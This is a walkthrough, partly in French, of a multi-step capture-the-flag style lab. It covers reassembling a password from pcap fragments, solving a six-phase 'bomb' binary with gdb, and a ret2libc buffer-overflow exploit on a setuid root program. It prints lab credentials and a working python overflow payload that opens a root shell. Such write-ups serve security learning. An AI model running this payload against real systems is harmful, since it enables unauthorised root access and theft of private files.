Title : overflow exploit

Reproduction step :

Step 1 :

1) First we investigate the machine IP (known with Virtualbox)

2) We scan the ports of the machine with Network utility and see that ftp / ssh / imap / imaps / http / https ports are open

3) Connect to the machine physically via lmezard account with password G!@M6f4Eatau{sF" (password gained from previous attack)

4) We copy fun file into /tmp

	cp fun /tmp

5) We untar that file

	tar -xvf fun

6) Then we fuse those file into a big one

	cd /ft_fun
	cat *.pcap > big

7) We investigate that file and see 12 functions that returns a letter. Those letters compose a password. We also see that this file is also not in the correct order

8) We search string containing getmeX (where X is a number)

9) Once we have located getmeX, we see which //fileX have to be searched

	//file736char getme1() {

	//file5}void uselless() {

10) We search for file6 since getme1() is contained into file5 and obtain the first letter

	//file697       return 'I';

	//file6}void useless() {

11) Once done for the 12 getme functions, we obtain the following password : Iheartpwnage

12) We encode it in sha-256 and obtain 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

13) We can now connect to laurie account with ssh using this password

Step 2 :

1) Ici on a une bombe a desamorcer en 6 etapes qu'on va etudier avec gdb'

2) phase 1 :
disas phase_1
Simple comparaison de strings avec 0x80497c0
->Public speaking is very easy.

3) phase 2 :
disas phase_2
Lecture de 6 entiers
Boucle pour comparer ces nombres avec comme condition arg(1) == 1 et arg(N) == arg(N - 1) * N , pour N = 2,…,6
->1 2 6 24 120 720

4) phase 3 :
disas phase_3
Lecture d’un entier, un char et un entier
On sait via les indices que la lettre doit être b
Le premier sert a faire le bon jump (cas su switch), donc 1 pour atteindre la lettre b (0x62) et pour passer la comparaison qui suit le 3e nombre doit être 0xd6
->1 b 214

5) phase 4 :
disas phase_4
Lecture d’un entier (> 0 suivant la condition en 0x08048d03)
Le retour de func4(n) doit être 45 (la comparaison est avec le nombre 55 mais il lui ajoute 10 juste avant)
func4 est une fonction recursive f(n) += f(n - 1)
->9

6) phase 5 :
disas phase_5
Lecture d’une string
La fonction compare le résultat du petit algorithme de cryptage avec giants
Le cryptage consiste a set le caractere n de notre string avec la lettre a l’index ce-meme-caractere-modulo-16 d’un tableau (isrveawhobpnutfg)
Il faut donc reconstruire la string giants en inversant ce processus
Toutes les lettres on 5 possibilités qui fonctionnent parmi les caracteres ASCII printables mais une seule est pourtant attendue pour le mot de passe
->opekmq

7) phase 6 :
disas phase_6
Lecture de six entiers
Tous les nombres doivent êtres differents et 0 < n < 7
Apres quelques tests, on trouve
-> 4 2 6 3 1 5
=> extrêmement bizarrement c’est pourtant 4 2 6 1 3 5 qui valide le mot de passe (et pas la bombe)

8) Suivant le README on concatene tous ces mots de passes pour avoir le mot de passe du prochain login thor

9) On peut s'y connecter avec Publicspeakingisveryeasy.126241207201b2149opekmq426135

Step 3 :

1) We manually draw the instruction contains in the file turtle and obtain SLASH

2) We encode in md5 SLASH and obtain the password 646da671ca01bb5d84dbb5fb2238dc8e for zaz account

Step 4 :

1) On a un programme en setuid appartenant a root

2) Sous gdb on voit qu'on peut reecrire l'EIP au bout de 140 caracteres et qu' il n'y a pas d'ASLR

3) On va faire un ret2libc basique :
b main
r
p system (0xb7e6b060)
p exit (0xb7e5ebe0)
quit

4) On va faire un petit programme (avec un nom de meme taille que l'original) pour recuperer l'adresse de la variable d'environnement SHELL (qu'on va set au prealable a /bin/bash -p pour plus de tranquilite quand on sera root)
//exploit_m2.c
int main() { printf("%p\n", getenv("SHELL")); }
gcc exploit_m2.c -o exploit_m2
SHELL="/bin/bash -p" ./exploit_m2
->0xbffff93d

5) On fait maintenant notre exploit
SHELL="/bin/bash -p" ./exploit_me $(python -c 'print "A" * 140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xbf\xff\xf9\x3d"[::-1]')

6) On est root

Explotibility : 

- Physical access to the machine is required

Impact :

- This exploit loads shell with root privilege, giving full access to the machine.
It gives an access to every user private file, files.
